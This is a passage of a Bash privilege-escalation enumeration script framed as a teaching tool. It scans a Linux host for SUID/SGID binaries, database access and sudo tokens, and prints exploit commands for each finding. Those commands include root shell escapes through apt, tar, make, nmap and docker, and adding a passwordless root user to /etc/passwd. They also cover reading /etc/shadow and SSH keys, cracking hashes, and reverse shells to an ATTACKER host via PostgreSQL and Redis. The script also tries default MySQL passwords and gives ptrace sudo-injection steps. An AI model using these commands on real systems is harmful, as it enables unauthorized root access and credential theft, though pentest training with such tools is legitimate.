                    
                apt|apt-get)
                    critical "SUID apt - Execute commands via APT Pre-Invoke"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  APT/APT-GET EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin update -o APT::Update::Pre-Invoke::=/bin/sh"
                    log ""
                    ;;
                    
                git)
                    critical "SUID git - Pager escape"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  GIT EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin help status"
                    teach "  Then in pager type: !sh"
                    log ""
                    ;;
                    
                tar)
                    critical "SUID tar - Checkpoint action execution"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  TAR EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                    log ""
                    ;;
                    
                make)
                    critical "SUID make - Execute Makefile commands"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  MAKE EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin -s --eval=\$'x:\\n\\t-/bin/bash -p'"
                    log ""
                    ;;
                    
                nmap)
                    critical "SUID nmap - Interactive mode shell escape"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  NMAP EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "Older nmap versions (< 5.21) have interactive mode:"
                    teach "  $suid_bin --interactive"
                    teach "  nmap> !sh"
                    teach ""
                    teach "Newer versions can use script execution:"
                    teach "  echo 'os.execute(\"/bin/bash -p\")' > /tmp/shell.nse"
                    teach "  $suid_bin --script=/tmp/shell.nse"
                    log ""
                    ;;
                    
                docker)
                    critical "SUID docker - Container escape to root"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  DOCKER EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "Mount host filesystem and chroot into it:"
                    teach "  $suid_bin run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
                    teach ""
                    teach "Or get privileged shell directly:"
                    teach "  $suid_bin run --rm -it --privileged alpine /bin/sh"
                    log ""
                    ;;
                    
                cp)
                    critical "SUID cp - Overwrite critical files"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  CP EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1: Overwrite /etc/passwd"
                    teach "  echo 'root2::0:0:root:/root:/bin/bash' > /tmp/passwd"
                    teach "  $suid_bin /tmp/passwd /etc/passwd"
                    teach "  su root2  # No password required"
                    teach ""
                    teach "METHOD 2: Overwrite SUID binary"
                    teach "  $suid_bin /bin/bash /usr/bin/some_suid_binary"
                    log ""
                    ;;
                    
                base64)
                    critical "SUID base64 - Read arbitrary files"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  BASE64 EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "Read sensitive files as root:"
                    teach "  $suid_bin /etc/shadow | base64 -d"
                    teach "  $suid_bin /root/.ssh/id_rsa | base64 -d"
                    teach ""
                    teach "Can't directly get shell, but can read root's SSH keys, shadow file, etc."
                    log ""
                    ;;
                    
                xxd)
                    critical "SUID xxd - Read/Write arbitrary files"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  XXD EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "Read sensitive files:"
                    teach "  $suid_bin /etc/shadow | xxd -r"
                    teach ""
                    teach "Write to protected files (add root user with no password):"
                    teach "  echo 'root2::0:0:root:/root:/bin/bash' | xxd | $suid_bin -r - /etc/passwd"
                    log ""
                    ;;
            esac
        done < "$temp_exploitable_suid"
    fi
}
# === SGID BINARIES ===
enum_sgid() {
    section "SGID BINARY ANALYSIS"
    
    explain_concept "SGID Bit" \
        "SGID (Set Group ID) is like SUID but for groups. The program runs with the file's group privileges." \
        "Less common than SUID for privilege escalation, but if SGID binary is in 'shadow' or 'docker' group, it can be exploited." \
        "Look for SGID binaries in privileged groups, then analyze like SUID binaries."
    
    # PHASE 1: SILENT SCAN - Collect findings by group
    local temp_sgid_shadow="/tmp/.learnpeas_sgid_shadow_$$"
    local temp_sgid_docker="/tmp/.learnpeas_sgid_docker_$$"
    local temp_sgid_disk="/tmp/.learnpeas_sgid_disk_$$"
    local temp_sgid_sudo="/tmp/.learnpeas_sgid_sudo_$$"
    
    cleanup_sgid_temps() {
        rm -f "$temp_sgid_shadow" "$temp_sgid_docker" "$temp_sgid_disk" "$temp_sgid_sudo" 2>/dev/null
    }
    trap cleanup_sgid_temps RETURN
    
    find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -2000 -type f -print 2>/dev/null | while read sgid_bin; do
        local group=$(stat -c %G "$sgid_bin" 2>/dev/null)
        local perms=$(stat -c %a "$sgid_bin" 2>/dev/null)
        
        case $group in
            shadow)
                echo "$sgid_bin|$perms" >> "$temp_sgid_shadow"
                ;;
            docker)
                echo "$sgid_bin|$perms" >> "$temp_sgid_docker"
                ;;
            disk)
                echo "$sgid_bin|$perms" >> "$temp_sgid_disk"
                ;;
            sudo)
                echo "$sgid_bin|$perms" >> "$temp_sgid_sudo"
                ;;
        esac
    done
    
    # PHASE 2: REPORT FINDINGS BY GROUP
    
    # Shadow group
    if [ -s "$temp_sgid_shadow" ]; then
        log ""
        critical "${WORK}[REQUIRES CRACKING]${RST} SGID BINARIES IN 'shadow' GROUP - Password hash access"
        log ""
        while IFS='|' read -r sgid_bin perms; do
            vuln "  $sgid_bin (Permissions: $perms)"
        done < "$temp_sgid_shadow"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  SHADOW GROUP EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT SHADOW GROUP GIVES YOU:"
        teach "  The 'shadow' group has read access to /etc/shadow, which contains"
        teach "  password hashes for all users on the system."
        teach ""
        teach "WHY THIS MATTERS:"
        teach "  • /etc/shadow is normally only readable by root (permissions: 640)"
        teach "  • It contains hashed passwords in formats like:"
        teach "    - \$6\$ = SHA-512 (modern, strong)"
        teach "    - \$5\$ = SHA-256"
        teach "    - \$1\$ = MD5 (old, weak)"
        teach "  • If you can read it, you can crack weak passwords offline"
        teach ""
        teach "EXPLOITATION STEPS:"
        teach ""
        teach "STEP 1: Use SGID binary to read /etc/shadow"
        local first_binary=$(head -1 "$temp_sgid_shadow" | cut -d'|' -f1)
        if [ -n "$first_binary" ]; then
            teach "  Check if binary can read files (strings, cat-like behavior):"
            teach "  $first_binary /etc/shadow"
        fi
        teach ""
        teach "  If that doesn't work, look for ways to abuse the binary:"
        teach "  • Check GTFOBins for the binary name"
        teach "  • Look for file read capabilities"
        teach "  • Try PATH hijacking if it calls other commands"
        teach ""
        teach "STEP 2: Extract password hashes"
        teach "  grep -v '!' /etc/shadow | grep -v '*'"
        teach "  Look for lines like: username:\$6\$salt\$hash:18000:0:99999:7:::"
        teach ""
        teach "STEP 3: Crack the hashes offline"
        teach "  Save hashes to a file:"
        teach "  grep '^[^:]*:\$' /etc/shadow > hashes.txt"
        teach ""
        teach "  Use John the Ripper:"
        teach "  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
        teach ""
        teach "  Or use Hashcat (faster with GPU):"
        teach "  hashcat -m 1800 -a 0 hashes.txt rockyou.txt"
        teach "  (mode 1800 = SHA-512 Unix)"
        teach ""
        teach "UNDERSTANDING /etc/shadow FORMAT:"
        teach "  username:\$algorithm\$salt\$hash:lastchange:min:max:warn:inactive:expire:"
        teach ""
        teach "  • \$6\$ = SHA-512 (secure, slow to crack)"
        teach "  • \$5\$ = SHA-256 (secure, slow to crack)"
        teach "  • \$1\$ = MD5 (WEAK, fast to crack)"
        teach "  • ! or * = account locked/disabled"
        teach "  • Empty hash field = no password (rare but critical)"
        teach ""
        teach "TARGET PRIORITY:"
        teach "  1. Look for users with MD5 hashes (\$1\$) - easiest to crack"
        teach "  2. Look for service accounts with passwords"
        teach "  3. Focus on admin/sudo group members"
        teach "  4. Users with recent lastchange dates (active accounts)"
        log ""
    fi
    
    # Docker group
    if [ -s "$temp_sgid_docker" ]; then
        log ""
        critical "SGID BINARIES IN 'docker' GROUP - Container escape to root"
        log ""
        while IFS='|' read -r sgid_bin perms; do
            vuln "  $sgid_bin (Permissions: $perms)"
        done < "$temp_sgid_docker"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  DOCKER GROUP EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT DOCKER GROUP GIVES YOU:"
        teach "  The 'docker' group can interact with Docker daemon socket."
        teach "  Docker daemon runs as root, so any docker command = root access."
        teach ""
        teach "WHY THIS IS CRITICAL:"
        teach "  Docker containers can mount the host filesystem and break out."
        teach "  Being in docker group is essentially equivalent to root access."
        teach ""
        teach "EXPLOITATION - METHOD 1: Mount host filesystem"
        teach "  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
        teach ""
        teach "  Explanation:"
        teach "  • -v /:/mnt = Mount host root directory to /mnt in container"
        teach "  • chroot /mnt = Change root to mounted host filesystem"
        teach "  • Result: You're root on the HOST, not just in container"
        teach ""
        teach "EXPLOITATION - METHOD 2: Privileged container"
        teach "  docker run --rm -it --privileged --net=host --pid=host --ipc=host \\"
        teach "    --volume /:/host alpine chroot /host /bin/bash"
        teach ""
        teach "EXPLOITATION - METHOD 3: Add yourself to sudoers"
        teach "  docker run -v /etc:/mnt --rm -it alpine sh -c \\"
        teach "    'echo \"youruser ALL=(ALL) NOPASSWD: ALL\" >> /mnt/sudoers'"
        teach ""
        teach "EXPLOITATION - METHOD 4: Create SUID shell"
        teach "  docker run -v /:/mnt --rm -it alpine sh -c \\"
        teach "    'cp /bin/sh /mnt/tmp/rootshell && chmod 4755 /mnt/tmp/rootshell'"
        teach "  /tmp/rootshell -p"
        teach ""
        teach "IMPORTANT NOTES:"
        teach "  • Check if you have access: docker ps"
        teach "  • Check available images: docker images"
        teach "  • If no images, pull one: docker pull alpine"
        teach "  • This works even without SGID - just being in docker group is enough"
        log ""
    fi
    
    # Disk group
    if [ -s "$temp_sgid_disk" ]; then
        log ""
        critical "SGID BINARIES IN 'disk' GROUP - Raw disk access"
        log ""
        while IFS='|' read -r sgid_bin perms; do
            vuln "  $sgid_bin (Permissions: $perms)"
        done < "$temp_sgid_disk"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  DISK GROUP EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT DISK GROUP GIVES YOU:"
        teach "  The 'disk' group has read/write access to raw disk devices."
        teach "  This includes: /dev/sda, /dev/sda1, /dev/nvme0n1, etc."
        teach ""
        teach "WHY THIS IS CRITICAL:"
        teach "  Raw disk access bypasses ALL file permissions."
        teach "  You can read/write any file on the filesystem, including:"
        teach "  • /etc/shadow (password hashes)"
        teach "  • /root/.ssh/authorized_keys"
        teach "  • Any root-owned file"
        teach ""
        teach "EXPLOITATION - METHOD 1: Read /etc/shadow via debugfs"
        teach "  debugfs /dev/sda1"
        teach "  debugfs: cat /etc/shadow"
        teach ""
        teach "EXPLOITATION - METHOD 2: Mount filesystem elsewhere"
        teach "  mkdir /tmp/mnt"
        teach "  mount /dev/sda1 /tmp/mnt"
        teach "  cat /tmp/mnt/etc/shadow"
        teach ""
        teach "EXPLOITATION - METHOD 3: Direct disk read with dd"
        teach "  # Find inode of /etc/shadow"
        teach "  debugfs -R 'stat /etc/shadow' /dev/sda1"
        teach "  # Read the file directly from disk"
        teach "  dd if=/dev/sda1 bs=4096 skip=<block_number> count=1"
        teach ""
        teach "EXPLOITATION - METHOD 4: Write root SSH key"
        teach "  debugfs -w /dev/sda1"
        teach "  debugfs: cd /root/.ssh"
        teach "  debugfs: write /tmp/my_key.pub authorized_keys"
        teach ""
        teach "COMMON DISK DEVICES:"
        teach "  • /dev/sda, /dev/sda1 = First SATA/SCSI disk"
        teach "  • /dev/nvme0n1 = NVMe SSD"
        teach "  • /dev/vda = Virtual disk (VMs)"
        teach ""
        teach "Check available disks: ls -la /dev/sd* /dev/nvme* /dev/vd*"
        log ""
    fi
    
    # Sudo group
    if [ -s "$temp_sgid_sudo" ]; then
        log ""
        warn "SGID BINARIES IN 'sudo' GROUP"
        log ""
        while IFS='|' read -r sgid_bin perms; do
            vuln "  $sgid_bin (Permissions: $perms)"
        done < "$temp_sgid_sudo"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  SUDO GROUP IMPLICATIONS"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT SUDO GROUP MEANS:"
        teach "  Being in the 'sudo' group typically means you can use sudo."
        teach "  SGID binaries in this group are less commonly exploitable."
        teach ""
        teach "CHECK YOUR SUDO ACCESS:"
        teach "  sudo -l"
        teach "  This shows what commands you can run with sudo."
        teach ""
        teach "IF YOU HAVE SUDO ACCESS:"
        teach "  Refer to the SUDO PERMISSIONS section of this script"
        teach "  for exploitation techniques."
        log ""
    fi
    
    # PHASE 3: SUMMARY
    if [ ! -s "$temp_sgid_shadow" ] && [ ! -s "$temp_sgid_docker" ] && \
       [ ! -s "$temp_sgid_disk" ] && [ ! -s "$temp_sgid_sudo" ]; then
        ok "No SGID binaries found in dangerous groups (shadow, docker, disk, sudo)"
    fi
}
# ═══════════════════════════════════════════════════
# EXTENDED MODULES (--extended flag)
# ═══════════════════════════════════════════════════

# === DATABASE ENUMERATION ===
enum_databases() {
    [ $EXTENDED -eq 0 ] && return
    
    section "DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation" \
        "Databases often run as root or privileged users. Weak credentials or UDF exploits can lead to command execution." \
        "MySQL/PostgreSQL allow file operations and command execution via User Defined Functions or built-in features. MariaDB/MySQL running as root + FILE privilege = read/write any file. PostgreSQL COPY FROM/TO can read/write files." \
        "Attack paths:\n  • Default credentials (root:root, root:password)\n  • Credentials in config files\n  • UDF exploitation for MySQL\n  • COPY FROM PROGRAM for PostgreSQL\n  • NoSQL injection for MongoDB"
    
    # Check for MySQL
    if command -v mysql >/dev/null 2>&1; then
        info "MySQL client is installed"
        
        # Try common credential combinations
        local mysql_creds=("root:" "root:root" "root:password" "root:toor")
        for cred in "${mysql_creds[@]}"; do
            local user=$(echo "$cred" | cut -d: -f1)
            local pass=$(echo "$cred" | cut -d: -f2)
            
            if [ -z "$pass" ]; then
                if mysql -u"$user" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with NO PASSWORD - Instant privilege escalation possible"
                    vuln "MySQL accessible with no password: $user"
                    teach "Exploitation:"
                    teach "  mysql -u$user -e 'SELECT LOAD_FILE(\"/etc/shadow\")'"
                    teach "  Or use UDF to execute commands if running as root"
                fi
            else
                if mysql -u"$user" -p"$pass" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with default password: $user:$pass"
                    vuln "MySQL accessible with default password: $user:$pass"
                fi
            fi
        done
        
        # Check for socket
        if [ -S /var/run/mysqld/mysqld.sock ]; then
            info "MySQL socket found at /var/run/mysqld/mysqld.sock"
            if [ -w /var/run/mysqld/mysqld.sock ]; then
                critical "MySQL socket is WRITABLE - Connect without credentials"
                vuln "MySQL socket is WRITABLE!"
                teach "Connect without credentials if file permissions allow"
            fi
        fi
    fi
    
    # Check for PostgreSQL
    if command -v psql >/dev/null 2>&1; then
        info "PostgreSQL client is installed"
        
        # Try connection
        if psql -U postgres -c "SELECT 1" 2>/dev/null | grep -q "1"; then
            critical "PostgreSQL accessible as postgres - Command execution via COPY TO PROGRAM"
            vuln "PostgreSQL accessible as postgres user"
            teach "PostgreSQL exploitation:"
            teach "  COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"'"
            teach "  Or read files: CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd';"
        fi
    fi
    
    # Check for MongoDB
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        info "MongoDB client is installed"
        warn "MongoDB often runs without authentication by default"
        teach "Try: mongo --eval 'db.version()'"
        teach "Then enumerate databases and collections"
    fi
    
    # Check for Redis
    if command -v redis-cli >/dev/null 2>&1; then
        info "Redis client is installed"
        if redis-cli ping 2>/dev/null | grep -q "PONG"; then
            critical "Redis accessible without auth - Write cron jobs or SSH keys"
            vuln "Redis is accessible without authentication!"
            explain_concept "Redis Exploitation" \
                "Redis is an in-memory database often used for caching. Unauthenticated access allows arbitrary command execution." \
                "Redis CONFIG SET allows changing server configuration, including setting the working directory and writing files. You can write SSH keys or cron jobs." \
                "Exploitation:\n  redis-cli config set dir /var/spool/cron/\n  redis-cli config set dbfilename root\n  redis-cli set x '\\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\n'\n  redis-cli save"
        fi
    fi
}

# === SUDO TOKEN HIJACKING ===
enum_sudo_tokens() {
    section "SUDO TOKEN HIJACKING"
    
    # === PHASE 1: SILENT SCAN - Collect all findings ===
    local temp_readable_tokens="/tmp/.learnpeas_sudo_tokens_$$"
    local temp_ptrace_enabled="/tmp/.learnpeas_ptrace_$$"
    local temp_sudo_processes="/tmp/.learnpeas_sudo_procs_$$"
    local found_issues=0
    
    cleanup_sudo_token_temps() {
        rm -f "$temp_readable_tokens" "$temp_ptrace_enabled" "$temp_sudo_processes" 2>/dev/null
    }
    trap cleanup_sudo_token_temps RETURN
    
    # Check if sudo token directory exists and is accessible
    if [ -d /var/run/sudo/ts ]; then
        # Check if we can list the directory
        if ls /var/run/sudo/ts/ >/dev/null 2>&1; then
            # Find readable token files
            find /var/run/sudo/ts/ -type f -readable 2>/dev/null | while read token; do
                local owner=$(stat -c %U "$token" 2>/dev/null)
                local perms=$(stat -c %a "$token" 2>/dev/null)
                
                # Skip our own tokens
                if [ "$owner" != "$(whoami)" ]; then
                    echo "$token|$owner|$perms" >> "$temp_readable_tokens"
                    found_issues=1
                fi
            done
        fi
    fi
    
    # Check ptrace_scope (needed for token hijacking via ptrace)
    if [ -r /proc/sys/kernel/yama/ptrace_scope ]; then
        local ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
        
        # 0 = unrestricted (can ptrace any process of same user)
        # 1 = restricted (can only ptrace descendants)
        # 2 = admin-only
        # 3 = disabled
        
        if [ "$ptrace_scope" = "0" ]; then
            echo "0|unrestricted" >> "$temp_ptrace_enabled"
            found_issues=1
        elif [ "$ptrace_scope" = "1" ]; then
            # Still useful if we can find sudo processes we spawned
            echo "1|restricted" >> "$temp_ptrace_enabled"
        fi
    fi
    
    # Check for active sudo processes from other users (non-root)
    ps aux | grep -E "sudo|su " | grep -v grep | while read line; do
        local proc_user=$(echo "$line" | awk '{print $1}')
        local proc_pid=$(echo "$line" | awk '{print $2}')
        
        # Skip our own processes AND root processes (can't ptrace root unless you're root)
        if [ "$proc_user" != "$(whoami)" ] && [ "$proc_user" != "root" ]; then
            echo "$proc_user|$proc_pid|$line" >> "$temp_sudo_processes"
        fi
    done
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    if [ $found_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  SUDO TOKEN HIJACKING - Understanding the Attack"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE SUDO TOKENS:"
        teach "  When you run sudo successfully, Linux creates a 'timestamp file'"
        teach "  in /var/run/sudo/ts/ that remembers you're authenticated."
        teach "  Default: Valid for 15 minutes (no password needed again)."
        teach ""
        teach "HOW SUDO TOKENS WORK:"
        teach "  1. User runs: sudo whoami"
        teach "  2. Sudo prompts for password"
        teach "  3. User enters correct password"
        teach "  4. Sudo creates: /var/run/sudo/ts/username"
        teach "  5. For next 15 minutes, no password needed"
        teach "  6. Token stored in memory AND file"
        teach ""
        teach "THE VULNERABILITY:"
        teach "  If you can READ another user's sudo token file OR"
        teach "  PTRACE their sudo process, you can steal their session."
        teach ""
        teach "WHY THIS MATTERS:"
        teach "  User A runs: sudo apt update (enters password)"
        teach "  → Token valid for 15 minutes"
        teach "  → You (User B) hijack their token"
        teach "  → You can now: sudo bash (as User A, no password!)"
        teach "  → If User A can sudo to root, YOU can sudo to root"
        teach ""
        teach "TWO ATTACK METHODS:"
        teach ""
        teach "  Method 1 - Direct Token Theft (if tokens readable):"
        teach "    • Rare, but happens with misconfigured permissions"
        teach "    • Copy victim's token file to your location"
        teach "    • Use sudo as victim"
        teach ""
        teach "  Method 2 - Ptrace Injection (if ptrace_scope=0):"
        teach "    • Attach to victim's sudo process with gdb/ptrace"
        teach "    • Inject shellcode to bypass authentication"
        teach "    • OR extract token from process memory"
        teach "    • More common, works if ptrace allowed"
        teach ""
        teach "REQUIREMENTS:"
        teach "  Direct theft:"
        teach "    ✓ Victim's token file readable (/var/run/sudo/ts/victim)"
        teach "    ✓ Victim has active sudo session (within 15 min)"
        teach ""
        teach "  Ptrace injection:"
        teach "    ✓ ptrace_scope = 0 (unrestricted)"
        teach "    ✓ Active sudo process from victim user"
        teach "    ✓ You can ptrace processes of same privilege level"
        teach ""
        teach "WHY ADMINS MISCONFIGURE THIS:"
        teach "  • Token directory permissions wrong (chmod 777 /var/run/sudo)"
        teach "  • ptrace_scope=0 for debugging (then forgotten)"
        teach "  • Shared dev environments (multiple users, convenience)"
        teach "  • Docker containers (often run with ptrace_scope=0)"
        log ""
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
    
    # Report readable tokens (CRITICAL - direct exploit)
    if [ -s "$temp_readable_tokens" ]; then
        critical "READABLE SUDO TOKENS - Steal other users' sudo sessions"
        log ""
        
        while IFS='|' read -r token owner perms; do
            critical "Token readable: $token"
            vuln "Owner: $owner | Permissions: $perms"
        done < "$temp_readable_tokens"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  DIRECT TOKEN THEFT EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "STEP-BY-STEP EXPLOITATION:"
        teach ""
        teach "  Step 1 - Verify token is fresh (within 15 minutes):"
        local first_token=$(head -1 "$temp_readable_tokens" | cut -d'|' -f1)
        local first_owner=$(head -1 "$temp_readable_tokens" | cut -d'|' -f2)
        teach "    stat $first_token"
        teach "    # Check 'Modify' timestamp - if recent, token is active"
        teach ""
        teach "  Step 2 - Check victim's sudo permissions:"
        teach "    sudo -l -U $first_owner"
        teach "    # See what $first_owner can run with sudo"
        teach ""
        teach "  Step 3 - Attempt to use their token:"
        teach "    # This is VERY distribution-specific and often doesn't work"
        teach "    # Modern sudo checks UID matching between token and process"
        teach "    # But worth trying:"
        teach ""
        teach "    # Method A - If sudo version is old (<1.8.15):"
        teach "    sudo -u $first_owner sudo bash"
        teach ""
        teach "    # Method B - Try copying token to your location:"
        teach "    cp $first_token /var/run/sudo/ts/\$(whoami)"
        teach "    sudo -k  # Reset your own token"
        teach "    sudo bash  # Try using copied token"
        teach ""
        teach "  REALISTIC EXPECTATION:"
        teach "    Direct token theft rarely works on modern systems."
        teach "    Readable tokens are still a finding (should be 700),"
        teach "    but ptrace method (below) is more reliable."
        teach ""
        teach "  WHY IT FAILS:"
        teach "    Modern sudo (>1.8.15) validates:"
        teach "    • Token UID matches process UID"
        teach "    • Token session ID matches current session"
        teach "    • TTY matches (if token was created with TTY)"
        teach ""
        teach "  WHEN IT WORKS:"
        teach "    • Very old sudo versions"
        teach "    • Custom sudo builds without validation"
        teach "    • Race conditions during token check"
        log ""
    fi
    
    # Report ptrace capability (MEDIUM - requires more work)
    if [ -s "$temp_ptrace_enabled" ]; then
        while IFS='|' read -r scope status; do
            if [ "$scope" = "0" ]; then
                critical "PTRACE UNRESTRICTED - Can inject into other users' sudo processes"
                vuln "ptrace_scope = 0 (unrestricted)"
                log ""
                
                teach "╔═══════════════════════════════════════════════════════════╗"
                teach "║  PTRACE INJECTION EXPLOITATION"
                teach "╚═══════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IS PTRACE:"
                teach "  ptrace() is the system call debuggers use to inspect/control"
                teach "  other processes. When ptrace_scope=0, you can attach to ANY"
                teach "  process running as your user or same privilege level."
                teach ""
                teach "THE ATTACK:"
                teach "  1. Victim user runs: sudo whoami (enters password)"
                teach "  2. Sudo process is now running, token in memory"
                teach "  3. You attach with gdb/ptrace to the sudo process"
                teach "  4. Inject code to bypass password OR steal token"
                teach "  5. Run your own sudo commands using hijacked session"
                teach ""
                teach "EXPLOITATION WITH SUDO_INJECT:"
                teach ""
                teach "  Tool: https://github.com/nongiach/sudo_inject"
                teach ""
                teach "  Step 1 - Find active sudo process:"
                teach "    ps aux | grep sudo | grep -v grep"
                teach "    # Look for sudo processes from other users"
                teach ""
                
                if [ -s "$temp_sudo_processes" ]; then
                    teach "  Active sudo processes found:"
                    while IFS='|' read -r proc_user proc_pid proc_line; do
                        teach "    User: $proc_user | PID: $proc_pid"
                    done < "$temp_sudo_processes"
                    teach ""
                    
                    local first_pid=$(head -1 "$temp_sudo_processes" | cut -d'|' -f2)
                    teach "  Step 2 - Download sudo_inject:"
                    teach "    git clone https://github.com/nongiach/sudo_inject"
                    teach "    cd sudo_inject"
                    teach "    make"
                    teach ""
                    teach "  Step 3 - Inject into sudo process:"
                    teach "    ./sudo_inject $first_pid"
                    teach "    # This injects shellcode that removes password check"
                    teach ""
                    teach "  Step 4 - Run sudo as that user:"
                    teach "    sudo bash"
                    teach "    # Should work without password prompt"
                else
                    teach "  Step 2 - Wait for victim to run sudo:"
                    teach "    watch -n 1 'ps aux | grep sudo'"
                    teach "    # When you see their sudo process, note the PID"
                    teach ""
                    teach "  Step 3 - Download sudo_inject:"
                    teach "    git clone https://github.com/nongiach/sudo_inject"
                    teach "    cd sudo_inject"
                    teach "    make"
                    teach ""
                    teach "  Step 4 - Inject into sudo process:"
                    teach "    ./sudo_inject [PID]"
                    teach ""
                    teach "  Step 5 - Run sudo:"
                    teach "    sudo bash"
                fi
                teach ""
                teach "ALTERNATIVE - Manual GDB Method:"
                teach "  # More complex but doesn't need tools"
                teach "  gdb -p [SUDO_PID]"
                teach "  (gdb) call (int)setuid(0)"
                teach "  (gdb) call (int)system(\"/bin/bash\")"
                teach "  (gdb) quit"
                teach ""
                teach "WHY THIS WORKS:"
                teach "  • ptrace_scope=0 allows attaching to same-user processes"
                teach "  • sudo runs with your UID (but EUID=0 temporarily)"
                teach "  • You can inject code into sudo's memory space"
                teach "  • Injected code bypasses password validation"
                teach "  • OR you can directly call setuid(0) from injected context"
                log ""
            elif [ "$scope" = "1" ]; then
                warn "ptrace_scope = 1 (restricted to descendants)"
                log ""
                teach "PARTIAL PROTECTION:"
                teach "  ptrace_scope=1 means you can only ptrace processes you spawned."
                teach "  You CANNOT directly ptrace other users' sudo processes."
                teach ""
                teach "POSSIBLE BYPASS:"
                teach "  If you can trick victim into running sudo inside YOUR shell:"
                teach "  1. Create malicious script that calls sudo"
                teach "  2. Victim executes your script"
                teach "  3. sudo becomes descendant of your shell"
                teach "  4. Now you can ptrace it"
                teach ""
                teach "Example:"
                teach "  # Create script that victim will run"
                teach "  echo 'sudo whoami' > /tmp/check.sh"
                teach "  chmod +x /tmp/check.sh"
                teach "  # Social engineer victim to run it"
                teach "  # When they do, sudo is your descendant"
                teach "  ps aux | grep sudo  # Get PID"
                teach "  gdb -p [PID]        # Now you can attach"
                log ""
            fi
        done < "$temp_ptrace_enabled"
    fi
    
    # Report active sudo processes (INFO - opportunity exists)
    if [ -s "$temp_sudo_processes" ]; then
        info "Active sudo processes from other users detected:"
        log ""
        
        while IFS='|' read -r proc_user proc_pid proc_line; do
            info "User: $proc_user | PID: $proc_pid"
            log "  Process: $(echo "$proc_line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')"
        done < "$temp_sudo_processes"
        
        log ""
        teach "TIMING WINDOW:"
        teach "  These processes indicate users who recently ran sudo."
        teach "  If ptrace is enabled, these are your targets."
        teach "  Token remains valid for ~15 minutes after sudo exits."
        log ""
    fi
    
    # === PHASE 4: CLEAN SUMMARY ===
    log ""
    if [ $found_issues -eq 0 ]; then
        ok "No sudo token hijacking opportunities detected"
        log ""
        teach "CHECKS PERFORMED:"
        teach "  ✓ Sudo token files (/var/run/sudo/ts/) - Not readable"
        teach "  ✓ ptrace_scope - Restrictive (or not exploitable)"
        teach "  ✓ Active sudo processes - None from other users"
        log ""
        teach "SUDO TOKEN SECURITY:"
        teach "  Your system appears protected against token theft."
